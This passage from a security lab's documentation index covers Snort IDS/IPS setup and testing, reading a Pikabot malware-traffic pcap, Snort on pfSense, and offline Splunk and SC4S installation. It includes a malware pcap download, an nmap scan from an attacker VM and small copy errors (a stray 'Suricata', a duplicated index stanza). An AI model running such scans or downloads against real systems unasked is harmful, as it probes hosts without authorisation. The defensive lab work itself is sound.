/usr/local/etc/pulledpork3/pulledpork.conf\n...\nWriting rules to:  /usr/local/etc/rules/pulledpork.rules\nProgram execution complete.\n</code></pre> <p>Edit snort\u2019s config to point to Pulledpork\u2019s rules</p> <pre><code>sudo nano /usr/local/etc/snort/snort.lua\n</code></pre> <p>Change the include path to point to pulledpork.rules</p> <pre><code>ips =\n{\n    -- use this to enable decoder and inspector alerts\n    enable_builtin_rules = true,\n\n    -- use include for rules files; be sure to set your path\n    -- note that rules files can include other rules files\n    -- (see also related path vars at the top of snort_defaults.lua)\n    include = \"/usr/local/etc/rules/pulledpork.rules\",\n    variables = default_variables\n}\n</code></pre> <p>You can see what the rules look like</p> <pre><code>cat /usr/local/etc/rules/pulledpork.rules | less\n</code></pre> <p>Test Snort</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua --plugin-path /usr/local/etc/so_rules/\n...\nSnort successfully validated the configuration (with 0 warnings).\n</code></pre> <p>Trigger alert by running:</p> <pre><code>curl http://testmyids.com\n</code></pre> <p>Verify that alerts are generated by the community rules</p> <pre><code>tail alert_fast.txt \n</code></pre> <pre><code>09/16-23:11:10.392572 [**] [1:498:11] \"INDICATOR-COMPROMISE id check returned root\" [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 217.160.0.187:80 -&gt; 10.0.0.22:36062\n09/16-23:11:12.926837 [**] [1:498:11] \"INDICATOR-COMPROMISE id check returned root\" [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 217.160.0.187:80 -&gt; 10.0.0.22:36076\n</code></pre>"},{"location":"snort/snort.html#test-ips","title":"Test IPS","text":"<p>Start Snort in IPS mode using DAQ AFPacket by running:</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua --daq afpacket -A alert_fast -l /var/log/snort -i ens32\n</code></pre> <p>Note to run Snort in IPS mode using DAQ NFQueue, run: </p> <pre><code>sudo snort -Q --daq nfq --daq-var device=ens32 --daq-var queue=1 -c /usr/local/etc/snort/snort.lua -A alert_fast -l /var/log/snort\n</code></pre> <p>Create the queue. To send traffic for the interface <code>ens32</code> to NFQ, for incoming and outgoing traffic on the <code>ens32</code> interface:</p> <pre><code>sudo iptables -I INPUT -i ens32 -j NFQUEUE --queue-num 1\nsudo iptables -I OUTPUT -o ens32 -j NFQUEUE --queue-num 1\n</code></pre> <p>For forwarded traffic (if Snort is installed at the gateway):</p> <pre><code>sudo iptables -I FORWARD -i ens32 -j NFQUEUE --queue-num 1\n</code></pre> <p>Verify iptables configuration by running:</p> <pre><code>sudo iptables -L -v -n\n</code></pre> <p>To determine the line numbers for your <code>NFQUEUE</code> rules, run:</p> <pre><code>sudo iptables -L --line-numbers\n</code></pre> <p>This will output a list of all the rules in your iptables with their corresponding line numbers. You should look for the rules in the <code>INPUT</code> and <code>OUTPUT</code> chains that mention <code>NFQUEUE</code>, and note their line numbers. Once you have the line numbers, you can delete the rules using:</p> <pre><code>sudo iptables -D INPUT &lt;line_number&gt;\nsudo iptables -D OUTPUT &lt;line_number&gt;\n</code></pre> <p>Change verb in the local.rules from <code>alert</code> to <code>drop</code> </p> <pre><code>nano /usr/local/etc/rules/local.rules\n</code></pre> <pre><code>drop icmp any any -&gt; $HOME_NET any (msg:\"ICMP Ping Detected\"; sid:1000001; rev:1;)\ndrop tcp any any -&gt; $HOME_NET 22 (msg:\"SSH Authentication Attempt\"; sid:1000002; rev:1;)\n</code></pre> <p>From another internal host, run ping to Snort virtual machine. Ping should not go through.</p> <pre><code>ping 10.0.0.22\n</code></pre> <p>Verify that alerts have been generated in alert_fast.txt</p> <pre><code>tail /var/log/snort/alert_fast.txt\n</code></pre> <p>Note: running Snort in IPS mode using DAQ NFQueue is ideal in this scenario but this does not generate logs in alert_fast.txt. For demonstration purposes, Snort was run in IPS mode using DAQ AFPacket.</p>"},{"location":"snort/snort.html#install-snort-ruleset-offline","title":"Install Snort Ruleset Offline","text":"<p>On a machine with internet connection, download snort3-community-rules.tar.gz from https://www.snort.org/downloads</p> <p>Transfer the tarball to the air-gapped environment. </p> <p>Make a folder called snort-rules</p> <p>Untar the tarball to snort-rules folder</p> <pre><code>mkdir ~/snort/snort-rules\ntar -xvzf snort3-community-rules.tar.gz -C /home/cyber/snort/snort-rules/\n</code></pre> <p>Merge all <code>.rules</code> into single rule file:</p> <pre><code>cat *.rules &gt; merged.rules\n</code></pre> <p>Move the Merged File to the pulledpork.rules in the Snort Rules Directory:</p> <pre><code>sudo mv merged.rules /etc/snort/rules/pulledpork.rules\n</code></pre>"},{"location":"snort/snort.html#malware-traffic-analysis-reading-pcap-with-snort","title":"Malware traffic analysis - reading pcap with Snort","text":"<p>Make a directory called test and cd into it.</p> <p>Download a sample pcap from https://www.malware-traffic-analysis.net</p> <pre><code>mkdir ~/test\ncd ~/test\nwget https://www.malware-traffic-analysis.net/2024/02/08/2024-02-08-TA577-Pikabot-infection-traffic.pcap.zip\nunzip 2024-02-08-TA577-Pikabot-infection-traffic.pcap.zip \n</code></pre> <p>Read the pcap with Snort and focus on signatures generated</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua --plugin-path /usr/local/etc/so_rules/ -r 2024-02-08-TA577-Pikabot-infection-traffic.pcap -A alert_fast -q &gt; pcap-signatures_pikabot.txt\n</code></pre> <p>Cat out or grep out pcap-signatures_pikabot.txt</p> <pre><code>cyber@Snort:~/test$ cat pcap-signatures_pikabot.txt | cut -d \"]\" -f 3 | cut -d \"[\" -f 1 |  cut -d '\"' -f 2 | sort | uniq -c | sort -nr\n    110 (arp_spoof) unicast ARP request\n      4 PROTOCOL-DNS SPOOF query response with TTL of 1 min. and no authority\n      4 INDICATOR-SCAN UPnP service discover attempt\n      1 (http_inspect) URI path contains consecutive slash characters\n      1 (http_inspect) Content-Transfer-Encoding used as HTTP header\n</code></pre> <pre><code>grep -i spoof pcap-signatures_pikabot.txt \n02/09-05:25:59.548577 [**] [1:254:17] \"PROTOCOL-DNS SPOOF query response with TTL of 1 min. and no authority\" [**] [Classification: Potentially Bad Traffic] [Priority: 2] {UDP} 10.2.8.1:53 -&gt; 10.2.8.101:64560\n02/09-05:29:14.405544 [**] [112:1:1] \"(arp_spoof) unicast ARP request\" [**] [Priority: 3] {ARP}  -&gt; \n</code></pre>"},{"location":"snort/snort.html#install-snort-on-gateway","title":"Install Snort on Gateway","text":"<p>While Suricata can be installed on a host, it can also be installed on a gateway such as pfSense. The pfSense\u00a0is a free and open source firewall and router. For installing and configuring pfSense, refer to pfSense documentation and instruction video. pfSense can be downloaded from here.</p> <p>Full demonstration video on configuring Suricata on pfSense can be found here. </p> <p>After competing basic configuration on pfSense, navigate to System &gt; Package Manager &gt; Available Packages on pfSense web UI.</p> <p>Search for <code>snort</code> and click install (confirm when prompted). Internet connection is required.</p> <p></p> <p>Navigate to Services &gt; Snort &gt; Global Settings tab. </p>"},{"location":"snort/snort.html#test-ids-and-ips-with-open-source-rules","title":"Test IDS and IPS with open source rules","text":"<p>In this demonstration, we are running Snort on the WAN interface. Full demonstration video can be found here. </p> <p>Select Enable Snort VRT. Copy and paste your Snort Oinkmaster Code (you will need to create an account in https://www.snort.org/).</p> <p>Enable Snort GPLv2, and ET Open.</p> <p></p> <p>Enable OpenAppID, AppID Open Text Rules, and FEODO Tracker Botnet C2 IP Rules.</p> <p>Set Rule Update Interval to 1 Day and select Hide Deprecated Rules Categories.</p> <p></p> <p>Select Remove Blocked Hosts interval to your preferred time. Click save.</p> <p></p> <p>Navigate to the Updates tab and click Update Rules.</p> <p></p> <p>Once the update is complete, you will see timestamps of when the update is completed.</p> <p></p> <p>Navigate to Interfaces tab and add a WAN interface. Enable Interface and name it WAN.</p> <p></p> <p>Select Block Offenders. Set IPS Mode to Legacy Mode and select SRC IP to Block. Click Save.</p> <p></p> <p>Navigate to WAN Categories. Select Use IPS Policy and set IPS Policy to Security. Click Save.</p> <p></p> <p>Navigate to WAN Rules. Select IPS Policy-Security and click Apply.</p> <p></p> <p>Navigate to WAN IP Rep and select Enable IP Reputation. Click Save.</p> <p></p> <p>Make sure the WAN interface is up and running. If not, click the play button.</p> <p></p> <p>Navigate to Firewall &gt; NAT and add 1:1 NAT for Windows host. </p> <p></p> <p>Navigate to Firewall &gt; Virtual IPs and add Public IP for Windows host.</p> <p></p> <p>From Kali machine, run <code>nmap (public IP)</code> </p> <p>Navigate to Alerts and verify that alerts have been generated.</p> <p></p> <p>Navigate to Blocked and verify that the Kali machine is being blocked</p> <p></p>"},{"location":"snort/snort.html#test-ids-and-ips-with-custom-rules","title":"Test IDS and IPS with custom rules","text":"<p>In this demonstration, we are running Snort on the LAN interface. </p> <p>Navigate to Snort Interfaces &gt; WAN Settings. In this demonstration, we have changed the WAN to LAN. Enable interface and name it as the LAN interface. </p> <p></p> <p>Save and Edit the LAN interface. Note instead of WAN Settings it now displays LAN Settings.</p> <p>Navigate to LAN Rules and select custom.rules. Copy and paste the following rule to detect ping from internal to external network.</p> <pre><code>alert icmp $HOME_NET any -&gt; [8.8.8.8] any (msg:\"ICMP Ping Detected to EXTERNAL IP\"; sid:1000001; rev:1;)\n</code></pre> <p></p> <p>Turn on the LAN interface by clicking the play button.</p> <p></p> <p>From the Windows host that is connect to an internal network, run ping to 8.8.8.8</p> <pre><code>ping 8.8.8.8\n</code></pre> <p>Navigate to Alerts and verify that Alerts have been generated.</p> <p></p> <p>Navigate to Snort Interfaces &gt; LAN Settings. </p> <p>Select Block Offenders. Set IPS Mode to Inline Mode and click Save.</p> <p></p> <p>Navigate to LAN Rules. Select custom.rules. Change the rule verb from <code>alert</code> to <code>drop</code> </p> <pre><code>drop icmp $HOME_NET any -&gt; [8.8.8.8] any (msg:\"ICMP Ping Detected to EXTERNAL IP\"; sid:1000001; rev:1;)\n</code></pre> <p></p> <p>From the Windows host that is connect to an internal network, run ping to 8.8.8.8</p> <pre><code>ping 8.8.8.8\n</code></pre> <p>Verify that pings were dropped.</p> <p></p>"},{"location":"snort/snort.html#references","title":"References","text":"<ul> <li>https://docs.snort.org/start/</li> <li>https://github.com/snort3/snort3</li> <li>https://youtu.be/j7Wapw3Gxvg?si=cVRojAePvL7z5rMx</li> <li>https://youtu.be/TvQfD5oUN5o?si=-Wx0jDCGnpeXz-8M</li> <li>https://youtu.be/SapAcfHbQSE?si=LPiMoqLVnZ5D2Lqx</li> </ul>"},{"location":"splunk/splunk.html","title":"Splunk","text":""},{"location":"splunk/splunk.html#splunk","title":"Splunk","text":"<p>Splunk Enterprise is a Security Information and Event Management (SIEM) tool usually installed on the server. It is designed for searching, analysing, and visualising data. It allows users to collect and ingest data, and search across various data types. Splunk Universal Forwarders are usually installed on clients to provide reliable, secure data collection and forward that data into Splunk Enterprise for indexing. This part of documentation focuses on installing and configuring Splunk. For Splunk, the main focus will be installing Splunk Enterprise and Universal Forwarder. </p>"},{"location":"splunk/splunk.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Splunk Enterprise was installed on an Ubuntu VM (Virtual Machine), and the Splunk Universal Forwarder was installed on both Ubuntu and Windows VMs. An attack emulation was conducted on the FortiGate VM in a safe and controlled environment.</p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> <p>For Documentation:</p> Hostname OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.10 (WAN) / 10.0.0.1 (LAN) Splunk Ubuntu 24.04 Splunk Enterprise (server), SC4S 10.0.0.100 Ubuntu Ubuntu 24.04 Splunk Universal Forwarder (Linux client) 10.0.0.200 WS2019 Windows Server 2019 Splunk Universal Forwarder (Windows client) 10.0.0.50 Kali Kali Linux 2025.1 Attacker machine 10.0.0.22 <p></p>"},{"location":"splunk/splunk.html#installing-splunk-enterprise-offline","title":"Installing Splunk Enterprise Offline","text":"<p>This documentation explains how to install Splunk Enterprise offline on Ubuntu or CentOS virtual machines (VMs).</p> <p></p>"},{"location":"splunk/splunk.html#on-an-internet-connected-machine-ubuntu","title":"On an Internet-Connected Machine (Ubuntu)","text":"<p>On an internet-connected Ubuntu VM, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p> <pre><code>sudo apt-get update\nmkdir -p ~/splunk-offline/{vmtools,nettools,docker,sc4s,apps}\n</code></pre> <p>Download and install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). After installing VM tools, reboot the VM. </p> <pre><code>cd ~/splunk-offline/vmtools\napt-get download \\\n  libatkmm-1.6-1v5 \\\n  libcairomm-1.0-1v5 \\\n  libglibmm-2.4-1t64 \\\n  libgtkmm-3.0-1t64 \\\n  libmspack0t64 \\\n  libpangomm-1.4-1v5 \\\n  libsigc++-2.0-0v5 \\\n  libxmlsec1t64 \\\n  libxmlsec1t64-openssl \\\n  open-vm-tools \\\n  open-vm-tools-desktop \\\n  zerofree\nsudo dpkg -i *.deb\n</code></pre> <p>Register on the Splunk website for a free trial and download Splunk Enterprise for Linux. There are options for <code>.tgz</code>, <code>.deb</code>, and <code>.rpm</code>. Use <code>wget</code> and copy and paste the wget link in the <code>splunk-offline</code> directory. </p> <pre><code>cd ~/splunk-offline\nwget -O splunk-9.4.1-linux-amd64.tgz \"https://download.splunk.com/products/splunk/releases/9.4.1/linux/splunk-9.4.1-&lt;SNIP&gt;-linux-amd64.tgz\"\n</code></pre> <p>Download Docker Engine and its dependencies. If you are using CentOS, skip this step as Podman is already installed.</p> <pre><code>#Ubuntu 22.04\ncd ~/splunk-offline/docker\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.22.04~jammy_amd64.deb\n</code></pre> <pre><code>#Ubuntu 24.04\ncd ~/splunk-offline/docker\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.24.04~noble_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.24.04~noble_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.24.04~noble_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.24.04~noble_amd64.deb\n</code></pre> <p>Download net-tools. </p> <pre><code>cd ~/splunk-offline/nettools\napt-get download net-tools\n</code></pre> <p>Download the latest SC4S container image\u00a0<code>oci_container.tgz</code>\u00a0from SC4S GitHub page.</p> <pre><code>cd ~/splunk-offline/sc4s\nwget https://github.com/splunk/splunk-connect-for-syslog/releases/download/v3.34.3/oci_container.tar.gz\n</code></pre> <p>Download the following Splunk Apps (tar archive files). You will need to login using the registered credential.</p> <ul> <li>Splunk Add-on for MS Windows</li> <li>Splunk Add-on for Sysmon</li> <li>Fortinet FortiGate Add-On for Splunk (optional: required if ingesting FortiGate logs through this App)</li> <li>Splunk Add-on for Unix and Linux</li> </ul> <p>Copy the Splunk Apps to <code>~/splunk-offline/apps/</code> directory. Verify that the apps have been copied.</p> <pre><code>cp ~/Downloads/*.tgz ~/splunk-offline/apps/\ncd ~/splunk-offline/apps/\nls\n</code></pre> <p>Compress all dependencies with <code>sudo</code> privileges before transferring them. This process may take some time.</p> <pre><code>cd ~/splunk-offline\nsudo tar -czvf splunk-offline.tar.gz *\n</code></pre> <p>Change the ownership of <code>splunk-offline.tar.gz</code> to your standard user and group, then verify the change.</p> <pre><code>sudo chown $(whoami):$(id -g -n) splunk-offline.tar.gz\nls -la\n</code></pre> <p>Transfer <code>splunk-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>"},{"location":"splunk/splunk.html#on-the-air-gapped-environment","title":"On the Air-Gapped Environment","text":"<p>On the air-gapped VM, make a directory called <code>splunk-offline</code> and extract the transferred archive. This process may take some time.</p> <pre><code>mkdir ~/splunk-offline &amp;&amp; cd ~/splunk-offline\ntar -xzvf ~/splunk-offline.tar.gz\n</code></pre> <p>Install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). After installing VM tools, reboot the VM. </p> <pre><code>cd ~/splunk-offline/vmtools\nsudo dpkg -i *deb\n</code></pre> <p>Install Docker and its dependencies. Verify Installation.</p> <pre><code>cd ~/splunk-offline/docker\nsudo dpkg -i *\ndocker --version\n</code></pre> <p>Run <code>sudo service docker start</code></p> <pre><code>sudo service docker start\n</code></pre> <p>Run the following command to add your user to the <code>docker</code> group:</p> <pre><code>sudo usermod -aG docker $(whoami)\n</code></pre> <p>Reload the group membership for your current session with the following command:</p> <pre><code>newgrp docker\n</code></pre> <p>Check if you can run Docker commands without <code>sudo</code>:</p> <pre><code>docker ps\n</code></pre> <p>Install net-tools and verify installation.</p> <pre><code>cd ~/splunk-offline/nettools\nsudo dpkg -i *.deb\nifconfig\n</code></pre> <p>In a new tab as the standard user, set the host OS kernel to match the default receiver buffer of SC4S, which is set to 16MB. Add the following content to <code>/etc/sysctl.conf</code>:</p> <pre><code>sudo nano /etc/sysctl.conf\n</code></pre> <pre><code>net.core.rmem_default = 17039360\nnet.core.rmem_max = 17039360\n</code></pre> <p>Apply to the kernel by running the command  <code>sysctl -p</code></p> <pre><code>sudo sysctl -p\n</code></pre> <p>Ensure the kernel is not dropping packets. Please note that you may see some packet receive errors due to the air-gapped environment. These errors can be ignored.</p> <pre><code>netstat -su | grep \"receive errors\" \n</code></pre> <p>Extract the <code>splunk-offline</code> tar archive to the <code>/opt</code> directory.</p> <pre><code>cd ~/splunk-offline\nsudo tar xvzf splunk*.tgz -C /opt\n</code></pre> <p>Create user <code>splunk</code> and change ownership of <code>/opt/splunk</code> directory to the <code>splunk</code> user. Enter password and user information for the <code>splunk</code> user (use default values by pressing <code>enter</code> ). </p> <pre><code>sudo adduser splunk\n</code></pre> <p>If you are using CentOS, after adding user, go to settings &gt; Users. Unlock to Change Settings. Set password for the\u00a0<code>splunk</code>\u00a0user. Make the <code>splunk</code> user the owner of the <code>/opt/splunk</code> directory and verify the ownership.</p> <pre><code>sudo chown -R splunk:splunk /opt/splunk\ncd /opt\nls -la\n</code></pre> <pre><code>#Example output\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Sep 18 15:36 .\ndrwxr-xr-x 20 root   root   4096 Sep 18 15:21 ..\ndrwxr-xr-x 11 **splunk splunk** 4096 Sep  6 05:58 splunk\n</code></pre> <p>Switch to <code>splunk</code> user and start Splunk Enterprise. When prompted, create admin credentials.</p> <pre><code>su splunk\n</code></pre> <pre><code>cd /opt/splunk/bin\n./splunk start --accept-license\n</code></pre> <pre><code>This appears to be your first time running this version of Splunk.\n\nSplunk software must create an administrator account during startup. Otherwise, you cannot log in.\nCreate credentials for the administrator account.\nCharacters do not appear on the screen when you type in credentials.\n\nPlease enter an administrator username: splunk #Create your username\nPassword must contain at least: #Create your password\n   * 8 total printable ASCII character(s).\nPlease enter a new password: \nPlease confirm new password: \n</code></pre> <p>In the <code>/opt/splunk/bin/</code> directory, configure Splunk to listen on port 9997</p> <pre><code>./splunk enable listen 9997\n</code></pre> <pre><code>#Example Output\nListening for Splunk data on TCP port 9997.\n</code></pre> <p>Navigate to <code>http://&lt;IP address&gt;:8000</code>on a web browser. Enter Splunk admin credentials. Verify that you can navigate the Splunk web interface.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-firewall-optional","title":"Configuring Firewall (Optional)","text":"<p>On Ubuntu, run the following command as a standard user in a new tab. This will configure and enable Firewall. In this lab, however, we will disable the firewall.</p> <pre><code>sudo ufw allow 514/tcp  # syslog TCP\nsudo ufw allow 514/udp  # syslog UDP\nsudo ufw allow 6514/tcp # syslog TLS\nsudo ufw allow 5425/tcp # syslog\nsudo ufw allow 601/tcp  # syslog\nsudo ufw allow 8000/tcp # Web UI Port\nsudo ufw allow 8080/tcp # HEC Port\nsudo ufw allow 8088/tcp # HEC Port\nsudo ufw allow 8089/tcp # Management Port\nsudo ufw allow 9997/tcp # Data flow\nsudo ufw allow 8065/tcp # Appserver\nsudo ufw allow 8191/tcp # KVstore\nsudo ufw enable\nsudo ufw reload\n</code></pre> <p>Alternatively, if you are on CentOS, run the following command to configure and enable Firewall:</p> <pre><code>sudo firewall-cmd --zone=public --add-port=514/tcp --permanent # syslog TCP\nsudo firewall-cmd --zone=public --add-port=514/udp --permanent # syslog UDP\nsudo firewall-cmd --zone=public --add-port=5514/udp --permanent # syslog UDP\nsudo firewall-cmd --zone=public --add-port=6514/tcp --permanent # syslog TLS\nsudo firewall-cmd --zone=public --add-port=5425/tcp --permanent # syslog\nsudo firewall-cmd --zone=public --add-port=601/tcp --permanent # syslog\nsudo firewall-cmd --zone=public --add-port=8000/tcp --permanent # Web UI Port\nsudo firewall-cmd --zone=public --add-port=8080/tcp --permanent # HEC port\nsudo firewall-cmd --zone=public --add-port=8088/tcp --permanent # HEC port\nsudo firewall-cmd --zone=public --add-port=8089/tcp --permanent # Managment Port\nsudo firewall-cmd --zone=public --add-port=9997/tcp --permanent # Data flow\nsudo firewall-cmd --zone=public --add-port=8065/tcp --permanent # appserver\nsudo firewall-cmd --zone=public --add-port=8191/tcp --permanent # kvstore\nsudo firewall-cmd --reload\nsudo firewall-cmd --list-all\n</code></pre>"},{"location":"splunk/splunk.html#configuring-fortigate","title":"Configuring FortiGate","text":"<p>Configure Port 1 as WAN interface and Port 2 as LAN interface. Set up DHCP to automatically assign IP addresses to clients connecting to the LAN.</p> <p></p> <p>Create a Firewall Policy to allow LAN to WAN. To simulate an air-gapped environment without internet access, the policy has been disabled.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-syslog-logging-on-fortigate","title":"Configuring Syslog Logging on FortiGate","text":"<p>On FortiGate Command-Line Interface (CLI), run the following commands to configure Syslog Server Settings:</p> <pre><code>config log syslogd setting\n    set status enable\n    set server &lt;syslog-ng IP&gt;\n    set source-ip &lt;FortiGate IP&gt;\n    # set port &lt;port number&gt;  (Default port is 514)\n    # Verify settings by running \"show\"\nend\n</code></pre> <p>Configure Log Memory Filter:</p> <pre><code>config log memory filter\n    set forward-traffic enable\n    set local-traffic enable\n    set sniffer-traffic disable\n    set anomaly enable\n    set voip disable\n    set multicast-traffic enable\n    # Verify settings by running \"show full-configuration\"\nend\n</code></pre> <p>Configure Global System Settings:</p> <pre><code>config system global\n    set cli-audit-log enable\n    # Verify settings by running \"show\"\n    # Ensure the timezone is correct, e.g., \"Pacific/Auckland\"\nend\n</code></pre> <p>Enable Logging for Neighbour Events:</p> <pre><code>config log setting\n    set neighbor-event enable\nend\n</code></pre>"},{"location":"splunk/splunk.html#configuring-syslog-logging-on-cisco-isr-optional","title":"Configuring Syslog Logging on Cisco ISR (Optional)","text":"<p>On Cisco Integrated Services Router\u2019s (ISR) CLI, run the following command to verify Clock and Configure NTP</p> <pre><code>show clock\nntp server &lt;FortiGate IP&gt;\n</code></pre> <p>Enable Syslog Logging:</p> <pre><code>conf t\nlogging on\nlogging &lt;Syslog Server IP&gt;\nlogging trap 6\n# Use \"?\" to see available options\nexit\n</code></pre> <p>Verify Logging:</p> <pre><code>show logging\n# Port 514/UDP is used by default\n</code></pre> <p>Check Current Logging Configuration:</p> <pre><code>sh run | inc logging\n# Multiple syslog servers can be configured\n</code></pre> <p>Set IP Address for VLAN 1 and Test Connectivity:</p> <pre><code>conf t\ninterface vlan 1\nip address &lt;IP Address&gt; &lt;Subnet Mask&gt;\nno shutdown\nexit\n\n# Test connectivity to the syslog server\nping &lt;Syslog Server IP&gt;\n</code></pre> <p>Enable Log Sequence Numbers:</p> <pre><code>conf t\nservice sequence-numbers\n# Assigns sequence numbers to syslog messages in the order events occur\n</code></pre> <p>Configure Console Logging:</p> <pre><code>conf t\nline console 0\nlogging synchronous\n# Ensures syslog messages are displayed properly after configuration\nend\n</code></pre>"},{"location":"splunk/splunk.html#ingesting-fortigate-logs","title":"Ingesting FortiGate Logs","text":"<p>To ingest FortiGate logs into Splunk, you have two options:</p> <p>Option 1: Ingest FortiGate logs through SC4S. Option 2: Ingest FortiGate logs through Splunk\u2019s FortiGate App.</p> <p>Please select one option, as using both options simultaneously is not recommended. However, for demonstration purposes, we will first go through Option 1, followed by Option 2.</p> <p></p>"},{"location":"splunk/splunk.html#ingesting-fortigate-logs-through-sc4s-option-1","title":"Ingesting FortiGate Logs through SC4S (Option 1)","text":"<p>SC4S is an open source packaged solution for getting data into Splunk. It is based on the syslog-ng Open Source Edition (Syslog-NG OSE) and transports data to Splunk via the Splunk HTTP event Collector (HEC) rather than writing events to disk for collection by a Universal Forwarder.</p>"},{"location":"splunk/splunk.html#creating-indexes-for-sc4s","title":"Creating Indexes for SC4S","text":"<p>On the Splunk VM, as the <code>splunk</code> user, create an <code>indexes.conf</code> in the <code>/opt/splunk/etc/system/local</code> directory. Copy and paste the following content. This step will create the default indexes that are used by SC4S. It is important that you do not edit <code>/opt/splunk/etc/system/default/indexes.conf</code></p> <pre><code>nano /opt/splunk/etc/system/local/indexes.conf\n</code></pre> <pre><code>[default]\nlastChanceIndex = main\n\n[email]\nhomePath   = $SPLUNK_DB/email/db\ncoldPath   = $SPLUNK_DB/email/colddb\nthawedPath = $SPLUNK_DB/email/thaweddb\n\n[epav]\nhomePath   = $SPLUNK_DB/epav/db\ncoldPath   = $SPLUNK_DB/epav/colddb\nthawedPath = $SPLUNK_DB/epav/thaweddb\n\n[epintel]\nhomePath   = $SPLUNK_DB/epintel/db\ncoldPath   = $SPLUNK_DB/epintel/colddb\nthawedPath = $SPLUNK_DB/epintel/thaweddb\n\n[_metrics]\ndatatype=metric\nhomePath   = $SPLUNK_DB/_metrics/db\ncoldPath   = $SPLUNK_DB/_metrics/colddb\nthawedPath = $SPLUNK_DB/_metrics/thaweddb\n\n[syslogng_fallback]\nhomePath   = $SPLUNK_DB/syslogng_fallback/db\ncoldPath   = $SPLUNK_DB/syslogng_fallback/colddb\nthawedPath = $SPLUNK_DB/syslogng_fallback/thaweddb\n\n[test]\nhomePath   = $SPLUNK_DB/test/db\ncoldPath   = $SPLUNK_DB/test/colddb\nthawedPath = $SPLUNK_DB/test/thaweddb\n\n[test2]\nhomePath   = $SPLUNK_DB/test2/db\ncoldPath   = $SPLUNK_DB/test2/colddb\nthawedPath = $SPLUNK_DB/test2/thaweddb\n\n[infraops]\nhomePath   = $SPLUNK_DB/infraops/db\ncoldPath   = $SPLUNK_DB/infraops/colddb\nthawedPath = $SPLUNK_DB/infraops/thaweddb\n\n[osnix]\nhomePath   = $SPLUNK_DB/osnix/db\ncoldPath   = $SPLUNK_DB/osnix/colddb\nthawedPath = $SPLUNK_DB/osnix/thaweddb\n\n[oswin]\nhomePath   = $SPLUNK_DB/oswin/db\ncoldPath   = $SPLUNK_DB/oswin/colddb\nthawedPath = $SPLUNK_DB/oswin/thaweddb\n\n[oswinsec]\nhomePath   = $SPLUNK_DB/oswinsec/db\ncoldPath   = $SPLUNK_DB/oswinsec/colddb\nthawedPath = $SPLUNK_DB/oswinsec/thaweddb\n\n[netauth]\nhomePath   = $SPLUNK_DB/netauth/db\ncoldPath   = $SPLUNK_DB/netauth/colddb\nthawedPath = $SPLUNK_DB/netauth/thaweddb\n\n[netdlp]\nhomePath   = $SPLUNK_DB/netdlp/db\ncoldPath   = $SPLUNK_DB/netdlp/colddb\nthawedPath = $SPLUNK_DB/netdlp/thaweddb\n\n[netdns]\nhomePath   = $SPLUNK_DB/netdns/db\ncoldPath   = $SPLUNK_DB/netdns/colddb\nthawedPath = $SPLUNK_DB/netdns/thaweddb\n\n[netfw]\nhomePath   = $SPLUNK_DB/netfw/db\ncoldPath   = $SPLUNK_DB/netfw/colddb\nthawedPath = $SPLUNK_DB/netfw/thaweddb\n\n[netids]\nhomePath   = $SPLUNK_DB/netids/db\ncoldPath   = $SPLUNK_DB/netids/colddb\nthawedPath = $SPLUNK_DB/netids/thaweddb\n\n[netipam]\nhomePath   = $SPLUNK_DB/netipam/db\ncoldPath   = $SPLUNK_DB/netipam/colddb\nthawedPath = $SPLUNK_DB/netipam/thaweddb\n\n[netops]\nhomePath   = $SPLUNK_DB/netops/db\ncoldPath   = $SPLUNK_DB/netops/colddb\nthawedPath = $SPLUNK_DB/netops/thaweddb\n\n[netproxy]\nhomePath   = $SPLUNK_DB/netproxy/db\ncoldPath   = $SPLUNK_DB/netproxy/colddb\nthawedPath = $SPLUNK_DB/netproxy/thaweddb\n\n[netwaf]\nhomePath   = $SPLUNK_DB/netwaf/db\ncoldPath   = $SPLUNK_DB/netwaf/colddb\nthawedPath = $SPLUNK_DB/netwaf/thaweddb\n\n[email]\nhomePath   = $SPLUNK_DB/email/db\ncoldPath   = $SPLUNK_DB/email/colddb\nthawedPath = $SPLUNK_DB/email/thaweddb\n\n[netlb]\nhomePath   = $SPLUNK_DB/netlb/db\ncoldPath   = $SPLUNK_DB/netlb/colddb\nthawedPath = $SPLUNK_DB/netlb/thaweddb\n</code></pre> <p>In 